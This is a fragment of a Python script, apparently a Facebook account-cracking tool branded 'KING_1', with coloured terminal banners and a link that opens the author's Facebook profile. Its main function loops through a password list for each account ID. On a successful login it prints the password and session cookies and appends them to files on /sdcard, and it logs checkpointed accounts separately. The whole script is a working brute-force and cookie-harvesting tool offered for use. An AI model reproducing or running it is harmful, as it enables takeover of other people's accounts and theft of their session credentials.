...
import sys
#-----------Opening Print-----------#
print(' [\033[1;32m●\033[1;37m]\x1b[38;5;121m CHECKING KING_1 SERVER !\033[1;37m [\033[1;32m–\033[1;37m]\033[1;37m')
os.system(f'xdg-open https://www.facebook.com/rashood.khan.16')
A = '\x1b[1;97m' 
R = '\x1b[38;5;196m'
Y = '\033[1;33m'
G = '\x1b[38;5;48m'
...
#----------logo----------#
logo=(f"""
\x1b[38;5;46m.  _   _              _ ______ ______ ____  
 | \ | |   /\       | |  ____|  ____|  _ \ 
 |  \| |  /  \      | | |__  | |__  | |_) |
 | . ` | / /\ \ _   | |  __| |  __| |  _ < 
 | |\  |/ ____ \ |__| | |____| |____| |_) |
...
def MATHOD_1(ids,names,passlist):
    ...
    try:
        ...
        for pw in passlist:
            ...
            sys.stdout.write(f'\r     \x1b[38;5;153m[{G1}M1\x1b[38;5;153m]\x1b[38;5;215m-\x1b[38;5;153m[{G1}KING_1\x1b[38;5;153m]\x1b[38;5;215m-\x1b[38;5;153m[\x1b[38;5;212m{loop}\x1b[38;5;153m]\x1b[38;5;215m-\x1b[38;5;153m[{G1}OK:{len(oks)}\x1b[38;5;153m]');sys.stdout.flush()
            ...
            if 'session_key' in req:            	
                print('\r\r\x1b[38;5;46m [KING_1•OK] '+ids+' <> '+pas)   
                coki = ";".join(i["name"]+"="+i["value"] for i in req["session_cookies"])
                print("\r\r\x1b[38;5;193m<>❮ "+coki)
                oks.append(ids)
                open('/sdcard/KING_1–OKEY–M1.txt', 'a').write(ids+'|'+pas+'\n')
                open('/sdcard/KING_1•COOKIE•M1.txt','a').write(ids+'|'+pas+ '|' +coki+'\n')
                break
            elif 'www.facebook.com' in req['error']['message']:
                print('\r\r\033[1;34m [KING_1•CP] '+ids+' <> '+pas)
                open('/sdcard/KING_1-CP.txt', 'a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
    ...
    try:
        ...
        for pw in passlist:
            ...
            if 'session_key' in req:            	
                ...
                oks.append(ids)
                open('/sdcard/KING_1–OKEY–M2.txt', 'a').write(ids+'|'+pas+'\n')
                open('/sdcard/KING_1•COOKIE•M2.txt','a').write(ids+'|'+pas+ '|' +coki+'\n')
                break
            elif 'www.facebook.com' in req['error']['message']:
                print('\r\r\033[1;34m [KING_1•CP] '+ids+' <> '+pas)
                open('/sdcard/KING_1–CP.txt', 'a').write(ids+'|'+pas+'\n')
